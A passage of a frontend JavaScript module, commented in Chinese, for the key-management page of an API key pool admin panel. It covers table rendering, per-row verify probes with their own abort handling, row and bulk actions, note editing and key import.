「这一行在飞时按钮变灰」与「结果就地显示」**都会被任何一次并发 `load()` 抹掉**。\n * ⇒ `actionsCell()` 每次重建时都从这张表**重放**一遍。\n * ⚠️ **这句话上一版写的是「`render()` 的第一句有效动作是 `host.textContent = \"\"`」\n * ——复评实测为假**：第一句是 `syncCounts(shown)`，清表那句排在它后面好几条\n *（中间还有 `syncBulkBar()`、两条 note 文案、分页控件复位）。**结论不受影响**\n *（那句清表照样每次都跑），但「第一句」是一个没人核过、也不必要的强断言。\n * 由 `tests/ui/dom/keys-verify.test.ts` 的\n * 「验活在飞时打断一次 load()：这一行的按钮仍然禁用、行内结果仍然在」那一格钉着。\n *\n * ⚠️ **不清理**：键只可能来自当前页真实存在过的 key id，条目数与运维手点过的\n * 行数同量级；逐条清理反而要另一个时间轮（与 `src/http/admin/probe-guard.ts`\n * 那张 Map 的理由同源）。\n */\nconst verifyState = new Map();\n\n/** 取（必要时新建）某一把 key 的验活状态。 */\nfunction verifyStateFor(id) {\n  let s = verifyState.get(id);\n  if (s === undefined) {\n    s = { inFlight: false, lastAt: null, code: null, ctl: null, timer: null };\n    verifyState.set(id, s);\n  }\n  return s;\n}\n\n/** 汇总卡与筛选下拉里的条数。**没有数据时 fmtCount(null) 给出 `—`，不是 0。** */\nfunction syncCounts(shown) {\n  const c = cardCounts(shown);\n  for (const b of CARDS) {\n    nodes.cardValues[b].textContent = fmtCount(c[b]);\n    nodes.cardLabels[b].textContent = t(bucketLabelKey(b));\n    nodes.options[b].textContent = `${t(bucketLabelKey(b))}（${fmtCount(c[b])}）`;\n  }\n  for (const sec of AUTO_SECONDS) nodes.autoOptions[sec].textContent = t(autoLabelKey(sec));\n}\n\n/** `≈` 标记。它是产品不变式的一部分（近似值必须打标），由后端的 `approximate` 驱动。 */\nfunction approxMark() {\n  return el(\"span\", { class: \"approx\", title: t(\"keys.approxTip\", { touch: fmtDuration(knobs.touch) }) }, \"≈\");\n}\n\nfunction usageCell(v, approximate) {\n  const cell = el(\"td\");\n  const u = usageParts(v, approximate);\n  if (u.approx) cell.appendChild(approxMark());\n  cell.appendChild(el(\"span\", null, `${u.approx ? \" \" : \"\"}${fmtCount(u.requests)}`));\n  // 分母为 0 时 fmtPercent 返回 —，不是 0.0%：「一次都没跑过」与「成功率 0%」是两回事。\n  cell.appendChild(el(\"span\", { class: \"muted\" }, ` · ${fmtPercent(u.success, u.requests)}`));\n  return cell;\n}\n\nfunction lastUsedCell(v, approximate, offset) {\n  const cell = el(\"td\");\n  const l = lastUsedParts(v, approximate);\n  if (l.approx) {\n    // 「最后使用」与计数是同一份 staleness（同一次落盘一起带下去），tooltip 单独一条：\n    // 它说的是「时刻粗到一个触达间隔」，与计数那条「少计 + 晚落盘」不是同一句话。\n    cell.appendChild(el(\"span\", {\n      class: \"approx\", title: t(\"keys.approxLastUsedTip\", { touch: fmtDuration(knobs.touch) }),\n    }, \"≈\"));\n    cell.appendChild(el(\"span\", null, ` ${fmtInstant(l.at, offset)}`));\n  } else {\n    cell.appendChild(el(\"span\", null, l.at === null ? fmtDash(null) : fmtInstant(l.at, offset)));\n  }\n  return cell;\n}\n\n/** 选择框列。每次 render() 整表重建，`.checked` 直接从 `selected` 现算，\n *  不需要另外维护一份 DOM 引用表。 */\nfunction selectCell(v) {\n  const cell = el(\"td\");\n  const box = el(\"input\", { type: \"checkbox\" });\n  box.checked = selected.includes(v.id);\n  box.setAttribute(\"aria-label\", t(\"keys.selectRow\"));\n  box.addEventListener(\"change\", () => {\n    selected = toggleSelection(selected, v.id, box.checked);\n    // 单行勾选只影响批量条的可见性与计数、以及表头全选框要不要跟着打勾，\n    // 不需要整表重渲（那会打断用户正在连续勾选的动作、也会丢掉刚点开的下拉/焦点）。\n    syncBulkBar();\n    syncHeaderCheckbox();\n  });\n  cell.appendChild(box);\n  return cell;\n}\n\n/** 备注列。**恒 textContent**——note 是整份响应里唯一\"运维自由输入、又被投影\n *  回面板\"的字段，后端不转义，这一行就是那句话被执行的地方。 */\nfunction noteCell(v) {\n  const cell = el(\"td\");\n  cell.appendChild(el(\"span\", null, hasNote(v) ? v.note : fmtDash(null)));\n  return cell;\n}\n\n/**\n * 「验活」那一颗按钮 + 它的行内结果（P3d Task 9）。**整段每次 `render()` 重建，\n * 状态从 `verifyState` 重放**（见那张 Map 的说明）。\n *\n * ⚠️ **`disabled` 落在真的 `<button>` 上，不是落在包裹的 `<span>` / `<td>` 上。**\n * `tests/helpers/fake-dom.ts` 把 `.disabled` 挂在**每一个**元素实例上，\n * 这条盲区登记在 `tests/ui/dom/fake-dom-parity.test.ts`\n * 「盲区清单不是空的——如实登记按名字扫描拦不住的那几类，别让人以为门禁绿了就等于处处一致」\n * 那一格的 `KNOWN_BLIND_SPOTS` 第三条\n *（⚠️ **上一版把这个标识符指到了 `fake-dom.ts`，那个文件里根本没有它**——\n * 复评实测第 8 道门禁在这种位置上**不校验标识符锚**，把它换成一个不存在的名字\n * 照样绿，所以这一条只能靠人看）。把 `disabled` 设在一个 `<span>` 上，\n * 在全套 DOM 用例里照样绿、**在浏览器里毫无作用**。\n *\n * ⚠️ **时间取 `Date.now()`，不是 `actionsCell` 那个 `now` 参数。** 那个 `now` 是\n * `shown.generatedAt` —— **服务端**在上一次列表响应里给的时刻，它不随本地时间\n * 走动（自动刷新关着时能停在原地好几分钟）。冷却是一段**本地**流逝的时间，\n * 拿一个不动的时刻去减，按钮要么永远灰、要么永远亮。\n *\n * ⚠️ **结果元素只承载一个 i18n key，永远不承载响应体里的任何值**（全局约束 11(a)\n * 的前端半身）：`elI18n(tag, key)` 之后这段文本的全部来源就是五语言字典。\n * 想把 `latencyMs` / `status` 显示出来的话，得先想清楚它会不会顺带把别的东西\n * 也带出来——**别把请求或响应整份塞进 `title` 或任何调试出口**。\n * 由 `tests/ui/dom/keys-verify.test.ts` 的\n * 「验活之后这一行的文本与 title 里不出现响应体里的任何值」那一格钉着。\n */\nfunction verifyControl(v) {\n  const wrap = el(\"span\", { class: \"verify-wrap\" });\n  const s = verifyState.get(v && v.id);\n  const reason = verifyDisabledReason(v, s, Date.now());\n\n  const btn = elI18n(\"button\", \"keys.action.verify\", { type: \"button\", class: \"verify-btn\" });\n  btn.disabled = reason !== null;\n  btn.setAttribute(\"title\", t(verifyDisabledTitleKey(reason)));\n  btn.addEventListener(\"click\", () => { verifyOne(v); });\n  wrap.appendChild(btn);\n\n  if (s !== undefined && s.inFlight === true) {\n    wrap.appendChild(elI18n(\"span\", \"keys.verify.running\", { class: \"muted verify-result\" }));\n  } else if (s !== undefined && typeof s.code === \"string\") {\n    wrap.appendChild(elI18n(\"span\", verifyResultLabelKey(s.code), { class: \"verify-result\" }));\n    // 只读探针那句话与结果**一起**出现：运维恰恰是在看到「验活通过」的那一刻\n    // 以为 strikes 已经被清掉了（订正 F8）。\n    wrap.appendChild(elI18n(\"span\", \"keys.verify.readOnlyNote\", { class: \"muted note verify-note\" }));\n  }\n  return wrap;\n}\n\n/**\n * 跑一次验活。**一次一发是按行算的，不是按板块算的**——后端护栏的粒度就是\n * `verify:<id>`（`src/http/admin/probe-guard.ts` 里写着为什么不用全局粒度：\n * 全局粒度下验 A 会把验 B 一起挡掉）。\n *\n * ⚠️⚠️ **验活用自己的 `AbortController`，绝不复用模块级那个 `abort`。**\n * 那一个是列表加载的取消闸，`load()` 每次都会先 `abort.abort()` 再重新赋值。\n * 复用它的话：发起一次验活会取消在飞的列表加载，而任何一次 `load()`\n *（自动刷新 / 搜索防抖 / 任何一次行内动作的收尾）都会把在飞的验活作废掉——\n * 后者尤其阴：结果永远回不来，按钮却已经从「在飞」变回可点。\n * 由 `tests/ui/dom/keys-verify.test.ts` 的\n * 「验活在飞时跑一次 load()：验活的结果照样落地 —— 两者各用各的取消闸」那一格钉着。\n *\n * ⚠️ **`signal.aborted` 那一判是唯一在测试里可观测的那道闸**：`tests/ui/dom/harness.ts`\n * 的 `fetch` 替身与 `tests/helpers/fake-dom.ts` **零处**看 `signal`，被 abort 的那条链\n * 在测试里照样会 resolve（真实浏览器里 abort 也是异步的，同一个竞态存在）。\n * 这与 `js/sec-usage.js` / `js/sec-models.js` 用世代号守同一件事是同一条判据，\n * 只是这里的「世代」就是这一次自己的那把 controller。\n *\n * ⚠️ **不调 `load()`**（订正 F8）。它是**只读探针**：后端写零个存储字段，\n * 前端这一侧也不许借着「顺手刷新一下」把这一行的 `strikes` / 分档徽章换掉——\n * 那会让运维以为是验活改的。由 `tests/ui/dom/keys-verify.test.ts` 的\n * 「验活成功后这一行的 strikes 与分档徽章一个字都没变」那一格钉着\n *（那一格让第二次列表响应给出不同的 strikes，所以补一句 `load()` 当场变红）。\n */\nfunction verifyOne(view) {\n  const id = view && typeof view.id === \"string\" ? view.id : \"\";\n  // 点击时复查一次可用性：`render()` 之后到这一次点击之间状态可能已经变了\n  //（同一条判据、同一个函数，不在这里另写一份比较）。\n  // **拿现有状态查，查完再建**——否则一行点不动的 key（`no_key`）也会在那张表里\n  // 凭空落一项，而那张表的有界性全靠「键只可能来自真实存在过的 key id」。\n  if (verifyDisabledReason(view, verifyState.get(id), Date.now()) !== null) return;\n  const s = verifyStateFor(id);\n\n  const ctl = new AbortController();\n  s.inFlight = true;\n  s.ctl = ctl;\n  s.lastAt = Date.now();\n  s.code = null;\n  render();\n\n  api.post(`/keys/${id}/verify`, undefined, { signal: ctl.signal })\n    .then((body) => { if (!ctl.signal.aborted) s.code = verifyResultCode(body); })\n    .catch((e) => {\n      if (ctl.signal.aborted) return;\n      // 传输层与 200 响应体**严格分开**：护栏占用返回的 429 说的是「这次探测\n      // 根本没发出去」，与上游在不在限流毫无关系（见 pure/keys-write.mjs）。\n      s.code = verifyTransportCode(e);\n    })\n    .finally(() => {\n      // ⚠️ **收尾整段都在这个 `if` 里面**：`s.ctl !== ctl` 只有一种成因——\n      // `onHide()` 已经把这一次作废掉了。此时装定时器与重渲**都是错的**：\n      // 那会给一个已经切走的板块留一个 3 秒的孤儿定时器 + 一次不可见的 `render()`，\n      // 而 `stopTimers()` 的注释逐字写着这正是它要消灭的东西（复评 L3）。\n      if (s.ctl !== ctl) return;\n      s.ctl = null;\n      s.inFlight = false;\n      // 冷却到点之后要有一次重渲，否则那颗按钮会一直显示成「刚探过」——\n      // 自动刷新默认是关着的，没有别的东西会把它重画。\n      if (s.timer !== null) clearTimeout(s.timer);\n      s.timer = setTimeout(() => { s.timer = null; render(); }, VERIFY_MIN_INTERVAL_MS);\n      render();\n    });\n}\n\n/**\n * 行内动作列：验活、停用/启用、清冷却、清连续失败、解除剔除、备注、删除。\n *\n * ⚠️ **「验活」刻意排在最前面，不在设计 §10.2 那张清单的顺序里**：那张清单列的\n * 是六个**写**动作，而验活是这一行里唯一一个只读的探针（后端写零个存储字段）。\n * 把它混进写动作中间，运维会按位置把它当成又一个会改状态的按钮。\n *\n * **按钮可用性判据全部来自 `pure/keys-write.mjs`**，这里只把返回值接到\n * `.disabled` 上——`isDeletable` 尤其要紧：判据错一个字符，运维就会看到一颗\n * 永远点不动、或者永远点得动却总是 409 的删除按钮。\n */\nfunction actionsCell(v, now) {\n  const cell = el(\"td\", { class: \"row-actions\" });\n\n  cell.appendChild(verifyControl(v));\n\n  const toggle = elI18n(\"button\", toggleDisableLabelKey(v), { type: \"button\" });\n  toggle.addEventListener(\"click\", () => patchAction(v.id, { disabled: !v.disabled }));\n  cell.appendChild(toggle);\n\n  const clearCooldown = elI18n(\"button\", \"keys.action.clearCooldown\", { type: \"button\" });\n  clearCooldown.disabled = !canClearCooldown(v, now);\n  clearCooldown.addEventListener(\"click\", () => patchAction(v.id, { clearCooldown: true }));\n  cell.appendChild(clearCooldown);\n\n  const clearStrikes = elI18n(\"button\", \"keys.action.clearStrikes\", { type: \"button\" });\n  clearStrikes.disabled = !canClearStrikes(v);\n  clearStrikes.addEventListener(\"click\", () => clearStrikesAction(v));\n  cell.appendChild(clearStrikes);\n\n  const unevict = elI18n(\"button\", \"keys.action.unevict\", { type: \"button\" });\n  unevict.disabled = !canUnevict(v);\n  unevict.addEventListener(\"click\", () => patchAction(v.id, { unevict: true }));\n  cell.appendChild(unevict);\n\n  const noteBtn = elI18n(\"button\", \"keys.action.note\", { type: \"button\" });\n  noteBtn.addEventListener(\"click\", () => editNote(v));\n  cell.appendChild(noteBtn);\n\n  const del = elI18n(\"button\", \"keys.action.delete\", { type: \"button\", class: \"danger\" });\n  del.disabled = !isDeletable(v);\n  del.addEventListener(\"click\", () => deleteOne(v));\n  cell.appendChild(del);\n\n  return cell;\n}\n\nfunction row(v, now, offset, approximate) {\n  // `data-key-id` 不是渲染需要的东西——它只给测试当挂钩用，好在整表重建之后仍能\n  // 按 id 而不是按行序号找到某一行（`tests/ui/dom/keys-actions.test.ts` 用它)。\n  const tr = el(\"tr\", { \"data-key-id\": v.id });\n  tr.appendChild(selectCell(v));\n  tr.appendChild(el(\"td\", null, `#${v.seq}`));\n  tr.appendChild(el(\"td\", { class: \"mono\" }, v.masked));\n  const bucketCell = el(\"td\");\n  bucketCell.appendChild(el(\"span\", { class: badgeClass(v.bucket) }, t(bucketLabelKey(v.bucket))));\n  tr.appendChild(bucketCell);\n  tr.appendChild(el(\"td\", null, fmtInstant(v.addedAt, offset)));\n  tr.appendChild(lastUsedCell(v, approximate, offset));\n  const left = cooldownRemaining(v, now);\n  tr.appendChild(el(\"td\", null, left === null ? fmtDash(null) : fmtDuration(left)));\n  tr.appendChild(el(\"td\", null, fmtCount(v.strikes)));\n  tr.appendChild(usageCell(v, approximate));\n  const err = lastErrorParts(v);\n  tr.appendChild(el(\"td\", null, err === null ? fmtDash(null) : `${err.kind}（${fmtInstant(err.at, offset)}）`));\n  tr.appendChild(noteCell(v));\n  tr.appendChild(actionsCell(v, now));\n  return tr;\n}\n\n/** 当前页的 id 列表。`render()` 每次重算，`selectCell` 的单行勾选处理器靠它\n *  同步表头全选框（那时手上只有一个 `v`，够不到 `items`）。 */\nlet currentPageIds = [];\n\n/** 表头的全选复选框。**只对当前页 `items` 生效**（`selectAllIds`），\n *  勾选/取消都要整表重渲——每一行的 `.checked` 得跟着 `selected` 重算一遍。\n *  同时把这颗复选框记进 `nodes.selectAllBox`，好让单行勾选也能同步它\n *  （见 `syncHeaderCheckbox`）。 */\nfunction headerSelectCell(items) {\n  const th = el(\"th\");\n  const box = el(\"input\", { type: \"checkbox\" });\n  const pageIds = selectAllIds(items);\n  box.checked = headerSelectAllChecked(pageIds, selected);\n  box.setAttribute(\"aria-label\", t(\"keys.selectAll\"));\n  box.addEventListener(\"change\", () => {\n    selected = applySelectAll(selected, pageIds, box.checked);\n    render();\n  });\n  th.appendChild(box);\n  if (nodes) nodes.selectAllBox = box;\n  return th;\n}\n\n/** 批量条的可见性与「已选中 N 把」文案。挂在每次 render() 与每次单行勾选之后。 */\nfunction syncBulkBar() {\n  const n = selected.length;\n  nodes.bulkBar.style.display = bulkBarVisible(n) ? \"\" : \"none\";\n  nodes.bulkCount.textContent = t(\"keys.bulk.selectedCount\", { count: n });\n}\n\n/**\n * 表头「全选本页」复选框要不要跟着打勾。**单行勾选之后必须同步它**——不然\n * 运维手动把当前页的每一行都勾完，表头那颗复选框还显示着\"未全选\"，看起来\n * 像是漏了一行没勾上（评审可改项）。\n */\nfunction syncHeaderCheckbox() {\n  if (nodes && nodes.selectAllBox) {\n    nodes.selectAllBox.checked = headerSelectAllChecked(currentPageIds, selected);\n  }\n}\n\nfunction render() {\n  // **读失败一律当「没有数据」，且只判这一次**：三处各写一份 `loadError ? ... : data`\n  // 的话，下一次改动很容易只改其中两处（评审 N4）。\n  const shown = loadError ? null : data;\n  syncCounts(shown);\n  syncBulkBar();\n  // 先归零，读失败 / 空列表时表头全选框不该记着上一次页面的 id 集合。\n  currentPageIds = [];\n\n  // 两个旋钮的当前生效值可能比首次 render() 晚到（异步拉 /overview），\n  // 每次 render() 都用 `knobs` 现有的值重写这两句——拿到之后立刻生效，没拿到时\n  // fmtDuration(null) 给出 —，不假装知道旧的硬编码默认值。\n  nodes.autoNote.textContent = t(\"keys.autoNote\", { ttl: fmtDuration(knobs.ttl) });\n  nodes.freshnessNote.textContent = t(\"keys.freshness\", {\n    poolTtl: fmtDuration(knobs.ttl), edge: fmtDuration(knobs.edge),\n  });\n\n  // 分页控件先复位：读失败 / 空列表时留着上一次的「第 1/2 页 · 共 3 条」，\n  // 等于在展示一份已经不存在的数据。\n  const pager = pagerState(shown);\n  nodes.prev.disabled = pager.prevDisabled;\n  nodes.next.disabled = pager.nextDisabled;\n  nodes.pageInfo.textContent = pager.info === null\n    ? \"\"\n    : t(\"keys.pageInfo\", { page: pager.info.page, pages: pager.info.pages, total: pager.info.total });\n\n  const host = nodes.body;\n  host.textContent = \"\";\n  const messageKey = listMessageKey(shown, loadError);\n  if (messageKey !== null) {\n    host.appendChild(elI18n(\"p\", messageKey, { class: \"muted\" }));\n    return;\n  }\n  // 没有可渲染的条目就到此为止——判据与上面两处**共用同一个 itemsOf**，\n  // 畸形响应（items 不是数组）不会走到下面那个 for 里去抛异常。\n  const items = itemsOf(shown);\n  if (items === null) return;\n  currentPageIds = selectAllIds(items);\n\n  const table = el(\"table\");\n  const head = el(\"tr\");\n  head.appendChild(headerSelectCell(items));\n  for (const key of [\n    \"keys.col.seq\", \"keys.col.key\", \"keys.col.bucket\", \"keys.col.addedAt\", \"keys.col.lastUsedAt\",\n    \"keys.col.cooldown\", \"keys.col.strikes\", \"keys.col.usage\", \"keys.col.lastError\",\n  ]) head.appendChild(elI18n(\"th\", key));\n  head.appendChild(elI18n(\"th\", \"keys.col.note\"));\n  head.appendChild(elI18n(\"th\", \"keys.col.actions\"));\n  table.appendChild(head);\n  // 时区必须从参数进 fmtInstant，不许它去读运行环境的本地时区（见 pure/format.mjs）。\n  const offset = offsetMs();\n  for (const v of items) table.appendChild(row(v, shown.generatedAt, offset, shown.approximate));\n  host.appendChild(table);\n}\n\n/**\n * 拉一次 `/overview` 取三个旋钮的当前生效值。**只拉一次**（见 `knobs` 的说明），\n * 拿到之后重渲一次让文案立刻换上真实值；拿不到就保持 —，不重试到下一次 onShow。\n */\nasync function loadKnobs() {\n  if (knobsLoaded(knobs)) return;\n  try {\n    const body = await api.get(\"/overview\");\n    knobs = poolKnobs(body);\n  } catch (e) {\n    // 读失败：knobs 保持默认的三个 null，文案渲染成 —。\n  }\n  render();\n}\n\nasync function load() {\n  if (abort) abort.abort();\n  abort = new AbortController();\n  try {\n    const body = await api.get(`/keys?${keysQuery(state)}`, { signal: abort.signal });\n    data = body;\n    loadError = false;\n    // 服务端把越界页号回落到第 1 页，本地状态跟上，否则翻页按钮会与实际显示的页对不上。\n    state.page = body.page;\n  } catch (e) {\n    if (e && e.name === \"AbortError\") return;\n    // **不伪造 0，也不留着上一次的数据**：读失败就说读失败，\n    // 显示上一次的数字会让运维以为它是新的。\n    loadError = true;\n    data = null;\n  }\n  // 换页 / 换筛选 / 写操作之后重新拉取，都可能让已选中的某些 id 从当前页消失\n  // ——批量条上的「已选 N 把」不许继续数着几把已经看不见的行。\n  selected = pruneSelection(selected, loadError ? null : itemsOf(data));\n  render();\n}\n\nfunction stopTimers() {\n  if (timer !== null) { clearInterval(timer); timer = null; }\n  if (searchTimer !== null) { clearTimeout(searchTimer); searchTimer = null; }\n  // 验活冷却到点后的那一次重渲。切走板块之后没人要看这张表，留着只会在\n  // 一个已经不可见的板块上多跑一次 render()。\n  for (const s of verifyState.values()) {\n    if (s.timer !== null) { clearTimeout(s.timer); s.timer = null; }\n  }\n}\n\n/**\n * 作废所有在飞的验活，**并把已经显示出来的结果一起清掉**。\n * **与 `abort`（列表加载）是两条独立的闸**，`onHide()` 里两条都要放——\n * 少放哪一条，切回来时都会被上一次留下的东西盖住。\n *\n * `inFlight` 在这里一并归零：不归零的话那颗按钮会永远停在「上一次探测还在飞」，\n * 而那一次已经被作废、永远不会回来把它放开（`.finally()` 里的\n * `if (s.ctl !== ctl) return;` 此时已经生效）。\n *\n * ⚠️⚠️ **`code` 也必须清（复评 L4）。** 那句「验活通过」**没有任何时间上下文**——\n * 面板上它长得和「这把 key 现在是好的」一模一样。不清的话，切走十分钟再切回来\n * 仍然显示着上一次的结论，而这十分钟里这把 key 完全可能已经被上游吊销。\n * **结果只在这一行、这一次会话里就地显示**（订正 F8：它不落盘、不进 `stats`），\n * 那条纪律的另一半就是**它也不许跨越一次「离开这个板块」活下来**。\n * ⚠️ **`lastAt` 刻意不清**：后端那道最小间隔闸不会因为你切了个板块就重置，\n * 清掉它只会让运维按下去换回一句 429。\n */\nfunction abortVerifies() {\n  for (const s of verifyState.values()) {\n    if (s.ctl !== null) { s.ctl.abort(); s.ctl = null; }\n    s.inFlight = false;\n    s.code = null;\n  }\n}\n\nfunction restartTimer() {\n  if (timer !== null) { clearInterval(timer); timer = null; }\n  if (state.autoSec > 0) timer = setInterval(() => { load(); }, state.autoSec * 1000);\n}\n\n/**\n * 写操作失败时给用户看的话。优先用后端 `error.message`（人话），拿不到、\n * 或者它是 `isOpaqueErrorMessage()` 判出来的内部码时退回一句通用文案。\n *\n * ⚠️ 这句原来写着\"绝不把裸的 http_500 这类内部码丢给运维\"，而当时的判据只看\n * \"是不是非空字符串\"——那句话是假的（评审探针实测：500 无 message、401、\n * 备注超长的中文 message 三种都会原样进 toast）。现在判据搬进了\n * `pure/keys-write.mjs` 的 `isOpaqueErrorMessage()`，这里只调用它；那个函数的\n * 说明里也如实登记了\"后端中文校验 message 直投非中文面板\"这个仍未关掉的破口。\n */\nfunction errorMessage(e) {\n  const raw = e && typeof e.message === \"string\" ? e.message : \"\";\n  return isOpaqueErrorMessage(raw) ? t(\"keys.writeFailed\") : raw;\n}\n\n/** 单条 PATCH（停用/启用/清冷却/解除剔除/备注）的统一收尾：成功/失败都提示一次，\n *  并且不管成败都重新拉一次列表——写操作没有把最新视图带回来，只有 `{ok:true}`。 */\nfunction patchAction(id, body) {\n  api.patch(`/keys/${id}`, body)\n    .then(() => toast(t(\"keys.actionOk\"), \"ok\"))\n    .catch((e) => toast(errorMessage(e), \"err\"))\n    .finally(() => { load(); });\n}\n\n/**\n * 备注编辑。**`keepOpen: true`**——保存失败（网络 / 后端校验，例如超长）时\n * 不关弹窗，运维刚打的字还在文本框里，不用重新点开再打一遍。只有真的存成功\n * 才调用 `close()`。\n */\nfunction editNote(view) {\n  const textarea = el(\"textarea\", { rows: \"3\", maxlength: String(NOTE_MAX_LENGTH) });\n  textarea.value = view.note ?? \"\";\n  const body = el(\"div\");\n  body.appendChild(textarea);\n  openModal(\"keys.note.title\", body, [\n    { labelKey: \"common.cancel\" },\n    {\n      labelKey: \"keys.note.save\",\n      keepOpen: true,\n      onClick: (close) => {\n        api.patch(`/keys/${view.id}`, { note: noteToPatch(textarea.value) })\n          .then(() => { toast(t(\"keys.actionOk\"), \"ok\"); close(); load(); })\n          .catch((e) => toast(errorMessage(e), \"err\"));\n      },\n    },\n  ]);\n}\n\n/**\n * 单条删除。**不可撤销**，所以先弹一次确认（`rowActionNeedsConfirm` 判据）。\n *\n * ⚠️⚠️ **409 `must_disable_first` 与批量路径的 200 + 逐项 `reason` 是两种不同的\n * 形状**（见 `src/http/admin/handlers/keys-write.ts` 的 `keyDeleteHandler` 文件头）\n * ——这里从 `ApiError.status` 与 `ApiError.body.reason` 两处取信息，交给\n * `isMustDisableFirstConflict()` 判，给出一句比通用错误文案更准的提示；\n * 批量路径的对应处理在 `runBulk()`。\n */\nfunction deleteOne(view) {\n  if (!isDeletable(view)) return;\n  const run = () => {\n    api.del(`/keys/${view.id}`)\n      .then(() => toast(t(\"keys.actionOk\"), \"ok\"))\n      .catch((e) => {\n        if (e && isMustDisableFirstConflict(e.status, e.body && e.body.reason)) {\n          toast(t(\"keys.mustDisableFirst\"), \"warn\");\n        } else {\n          toast(errorMessage(e), \"err\");\n        }\n      })\n      .finally(() => { load(); });\n  };\n  if (rowActionNeedsConfirm(\"delete\")) confirmModal(\"keys.deleteConfirmTitle\", \"keys.deleteConfirmMsg\", run);\n  else run();\n}\n\n/**\n * 「清连续失败」。**先弹一次确认**，但理由与删除那颗不一样——不是「不可撤销」\n * （strikes 后续失败还会重新累积），是「容易与『清冷却』混淆」（`rowActionNeedsConfirm`\n * 的说明）：清冷却只让这把 key 现在能用，离下一次被剔除仍只差一次失败；这颗才\n * 是真的清账。确认文案（`keys.clearStrikesConfirmMsg`）必须把这句话点名说出来。\n */\nfunction clearStrikesAction(view) {\n  if (!canClearStrikes(view)) return;\n  const run = () => patchAction(view.id, { clearStrikes: true });\n  if (rowActionNeedsConfirm(\"clearStrikes\")) {\n    confirmModal(\"keys.clearStrikesConfirmTitle\", \"keys.clearStrikesConfirmMsg\", run);\n  } else {\n    run();\n  }\n}\n\n/**\n * 批量操作的落地。\n *\n * ⚠️⚠️ **这是 2(a) 那条交接落地的地方**：`bulk` 端点永远 200，「必须先停用才能删」\n * 只活在 `results[i].reason` 里。`bulkResultSummary()` 把它算成 `failed` 这个数，\n * `bulkResultPresentation()` 把它再投影成\"拼哪些 key、`kind`、`sticky`\"——\n * 只要 `failed` 大于 0，headline 就必须选中 `keys.bulk.partial` 而不是\n * `keys.bulk.allOk`，且 `mustDisableFirst` 的具体数字要被拼进提示文案——\n * 拿 `res.status` 当唯一判据的写法在这条路径上永远走不到这一段。\n *\n * ⚠️⚠️ **`summary.failed > 0` 时这条 toast 是 `sticky`（控制端追加裁定）**：\n * 它藏在 HTTP 200 的响应体里，本来就是最容易被忽略的那类信息，4 秒自动消失\n * 等于把一条诚实信号做成了几乎看不见的信号。全部成功时仍是普通的 4 秒 toast\n * ——不需要留痕的信息没必要多一次点击。\n *\n * ⚠️ **`catch` 分支（整批请求都没打成，例如网络中断 / 500）同样 `sticky`**\n * ——它与\"200 但一部分被拒\"是同一类\"不看见就会误判\"的信息，评审指出第一版\n * 漏了这一半：只有响应体里带 `results` 的那种失败被认真对待，请求本身失败\n * 时反而退回普通的 4 秒 toast，两种\"失败\"里更严重的那种被更轻地对待了。\n */\nasync function runBulk(op, ids) {\n  try {\n    const body = await api.post(\"/keys/bulk\", { op, ids });\n    const summary = bulkResultSummary(body && body.results);\n    const presentation = bulkResultPresentation(summary);\n    const text = presentation.messageKeys.map((key) => t(key, summary)).join(\"\");\n    toast(text, presentation.kind, presentation.sticky ? { sticky: true } : undefined);\n  } catch (e) {\n    toast(errorMessage(e), \"err\", { sticky: true });\n  } finally {\n    selected = [];\n    load();\n  }\n}\n\nfunction runBulkWithConfirm(op) {\n  const ids = [...selected];\n  if (ids.length === 0) return;\n  if (!bulkNeedsConfirm(op)) { runBulk(op, ids); return; }\n  const msg = el(\"p\", null, t(\"keys.bulk.confirmDelete\", { count: ids.length }));\n  openModal(\"keys.bulk.confirmTitle\", msg, [\n    { labelKey: \"common.cancel\" },\n    { labelKey: \"common.confirm\", danger: true, onClick: () => runBulk(op, ids) },\n  ]);\n}\n\nfunction buildBulkBar() {\n  const bar = el(\"div\", { class: \"toolbar bulk-bar\" });\n  const count = el(\"span\", { class: \"muted\" });\n  bar.appendChild(count);\n\n  const disableBtn = elI18n(\"button\", \"keys.bulk.disable\", { type: \"button\" });\n  disableBtn.addEventListener(\"click\", () => runBulkWithConfirm(\"disable\"));\n  bar.appendChild(disableBtn);\n\n  const clearCooldownBtn = elI18n(\"button\", \"keys.bulk.clearCooldown\", { type: \"button\" });\n  clearCooldownBtn.addEventListener(\"click\", () => runBulkWithConfirm(\"clearCooldown\"));\n  bar.appendChild(clearCooldownBtn);\n\n  const deleteBtn = elI18n(\"button\", \"keys.bulk.delete\", { type: \"button\", class: \"danger\" });\n  deleteBtn.addEventListener(\"click\", () => runBulkWithConfirm(\"delete\"));\n  bar.appendChild(deleteBtn);\n\n  // 默认藏起来：批量条「选中才出现」（设计文档 §10.2），`syncBulkBar()` 之后接管。\n  bar.style.display = \"none\";\n  return { bar, count };\n}\n\n/**\n * 导入弹窗。**textarea 的内容原样按行发给后端**（`importLines()`），不在这里\n * trim 整段、也不过滤空行——过滤空行会让后端报回来的行号（1 基、按原始下标算）\n * 与运维在文本框里数到的行号错位，见 `src/core/keypool-repo.ts` 的 `addMany()`。\n *\n * ⚠️⚠️ **`keepOpen: true`，评审抓到的一个真缺陷**：`openModal` 原来的 `onClick`\n * 无条件先关弹窗再跑回调，于是校验失败（空提交）或网络/后端失败时，弹窗已经\n * 关掉、粘进去的最多 200 行原文全部丢失，运维只看到一句 toast、没有机会照着\n * 报错改正再重试。现在只有**真的拿到成功响应**才调用 `close()`；校验失败与\n * 请求失败都让弹窗留在原地，文本框里的内容原封不动。\n */\nfunction openImport() {\n  const textarea = el(\"textarea\", { rows: \"8\", \"data-i18n-ph\": \"keys.import.placeholder\" });\n  textarea.setAttribute(\"placeholder\", t(\"keys.import.placeholder\"));\n\n  const resetLabel = el(\"label\", { class: \"auto\" });\n  const resetBox = el(\"input\", { type: \"checkbox\" });\n  resetLabel.appendChild(resetBox);\n  resetLabel.appendChild(elI18n(\"span\", \"keys.import.resetExisting\"));\n\n  const body = el(\"div\");\n  body.appendChild(textarea);\n  body.appendChild(resetLabel);\n  body.appendChild(elI18n(\"p\", \"keys.import.resetExistingWarn\", { class: \"muted note\" }));\n\n  openModal(\"keys.import.title\", body, [\n    { labelKey: \"common.cancel\" },\n    {\n      labelKey: \"keys.import.submit\",\n      keepOpen: true,\n      onClick: (close) => {\n        const lines = importLines(textarea.value);\n        if (!hasImportableContent(lines)) { toast(t(\"keys.import.emptyErr\"), \"warn\"); return; }\n        api.post(\"/keys\", { keys: lines, resetExisting: resetBox.checked })\n          .then((res) => {\n            const c = importResultCounts(res);\n            const presentation = importResultPresentation(c);\n            let text = 